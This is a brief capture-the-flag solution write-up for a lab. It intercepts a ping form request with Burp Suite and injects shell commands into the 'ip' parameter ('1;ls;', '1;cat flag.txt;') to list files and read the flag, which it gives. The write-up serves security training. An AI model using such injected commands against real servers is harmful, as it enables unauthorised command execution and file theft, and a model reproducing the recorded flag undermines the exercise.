## Challenge
Try intercepting the ping request on the server shown above, and change the post data similarly to what we did in this section. Change the command to read 'flag.txt'

## Solution
I open the built-in browser in Burp and visit the page.

I just write the number 1, in the address to ping, and check the history on burp.

I send the request to the Burp Repeater, and I see the body is `ip=1`

I modify that to `ip=1;ls;` and I got the following result:

```sh
flag.txt
index.html
node_modules
package-lock.json
public
server.js
```

Now I modify the body to `ip=1;cat flag.txt;` and the flag is `HTB{1n73rc3p73d_1n_7h3_m1ddl3}`.

